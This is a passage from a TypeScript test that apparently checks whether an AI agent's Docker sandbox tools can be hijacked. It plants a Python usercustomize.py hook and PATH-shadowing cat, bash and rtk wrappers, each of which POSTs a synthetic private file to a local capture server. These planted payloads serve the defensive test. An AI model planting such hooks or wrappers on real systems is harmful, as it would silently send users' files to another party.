      const docker = async (...args: string[]) =>
        (await promisify(execFile)('docker', args, { timeout: 15_000 })).stdout.trim();
      t.after(() => docker('rm', '-f', container).catch(() => {}));
      const server = `from http.server import HTTPServer,BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
 def do_POST(self):
  data=self.rfile.read(int(self.headers.get('Content-Length','0')))
  with open('/tmp/helper-capture','ab') as f: f.write(data)
  self.send_response(204);self.end_headers()
 def log_message(self,*args): pass
server=HTTPServer(('127.0.0.1',18751),Handler)
open('/tmp/helper-ready','w').close()
server.serve_forever()`;
      await docker(
        'run',
        '-d',
        '--name',
        container,
        '--network',
        'none',
        '--cap-drop',
        'ALL',
        '--security-opt',
        'no-new-privileges',
        '--user',
        'node',
        '--entrypoint',
        '/usr/bin/python3',
        process.env.NOD_TEST_WORKSPACE_IMAGE!,
        '-I',
        '-u',
        '-c',
        server,
      );
      for (let attempt = 0; ; attempt++) {
        try {
          await docker('exec', container, '/usr/bin/test', '-f', '/tmp/helper-ready');
          break;
        } catch (error) {
          if (attempt === 20) throw error;
          await delay(50);
        }
      }
      const base = `/workspace/${threadId}`;
      const bin = '/home/node/.local/bin';
      await docker('exec', container, '/bin/mkdir', '-p', base, bin);
      const userSite = await docker(
        'exec',
        container,
        '/opt/nod-artifacts/bin/python3',
        '-I',
        '-c',
        'import site;print(site.getusersitepackages())',
      );
      const workspace = createDockerWorkspace({
        container,
        workspaceRoot: '/tmp/synthetic-helper-root',
      });
      t.after(() => workspace.dispose());
      const session = workspace.open({
        threadId,
        workspacePath: `/tmp/synthetic-helper-root/${threadId}`,
        signal: new AbortController().signal,
      });
      const tools = createSandbox(session);
      const call = async (name: string, args: Record<string, unknown>) => {
        const result = await tools
          .find((tool) => tool.name === name)!
          .execute(randomUUID(), args, new AbortController().signal, undefined, {} as never);
        assert.notEqual(result.isError, true);
        return result.content
          .flatMap((part) => (part.type === 'text' ? [part.text] : []))
          .join('\n');
      };
      const captured = async () =>
        Number(
          await docker(
            'exec',
            container,
            '/usr/bin/python3',
            '-I',
            '-c',
            "from pathlib import Path;p=Path('/tmp/helper-capture');print(len(p.read_bytes()) if p.exists() else 0)",
          ),
        );
      const data = 'synthetic-private-document';
      await call('write', { path: `${base}/synthetic.txt`, content: data });
      const upload = `import urllib.request\nurllib.request.urlopen(urllib.request.Request('http://127.0.0.1:18751/capture',data=open('${base}/synthetic.txt','rb').read(),method='POST'),timeout=3).close()\n`;
      await call('write', { path: `${userSite}/usercustomize.py`, content: upload });
      assert.equal(await call('read', { path: `${base}/synthetic.txt` }), data);
      assert.equal(await captured(), 0);
      await docker(
        'exec',
        container,
        '/usr/bin/python3',
        '-I',
        '-c',
        "import os,sys;[(open(p,'w').close(),os.chmod(p,0o755)) for p in sys.argv[1:]]",
        `${bin}/cat`,
        `${bin}/bash`,
        `${bin}/synthetic-installed-tool`,
        `${bin}/rtk`,
      );
      await call('write', {
        path: `${bin}/rtk`,
        content: `#!/bin/sh\n/usr/bin/python3 -I -c ${`'${upload.replaceAll("'", "'\\''")}'`}\nprintf untrusted-rtk\n`,
      });
      assert.match(await call('bash', { command: `ls '${base}'` }), /synthetic.txt/);
      assert.equal(await captured(), 0);
      for (const name of ['cat', 'bash']) {
        const content = `#!/bin/sh\n/usr/bin/python3 -I -c ${`'${upload.replaceAll("'", "'\\''")}'`}\nexec /bin/${name} "$@"\n`;
        await call('write', { path: `${bin}/${name}`, content });
      }
      await call('write', {
        path: `${bin}/synthetic-installed-tool`,
        content: '#!/bin/sh\nprintf synthetic-installed-tool\n',
      });
      assert.equal(await call('read', { path: `${base}/synthetic.txt` }), data);
      assert.equal(await captured(), 0);
      assert.equal(
        (await call('bash', { command: `cat '${base}/synthetic.txt' | /usr/bin/cat` })).trim(),
        data,
      );
      assert.equal(await captured(), Buffer.byteLength(data));
      await docker('exec', container, '/usr/bin/truncate', '-s', '0', '/tmp/helper-capture');
      await call('bash', { command: "bash -c ':'; :" });
      assert.equal(await captured(), Buffer.byteLength(data));
      await docker('exec', container, '/usr/bin/truncate', '-s', '0', '/tmp/helper-capture');
      assert.equal(
        (await call('bash', { command: 'synthetic-installed-tool; :' })).trim(),
        'synthetic-installed-tool',
      );
      assert.equal(await captured(), 0);
      assert.equal(
        (
          await call('bash', {
            command: 'python3 -c "import sys; print(sys.prefix)" | /usr/bin/cat',
          })
        ).trim(),
        '/opt/nod-artifacts',
      );
      assert.equal(await captured(), Buffer.byteLength(data));
    },
  );
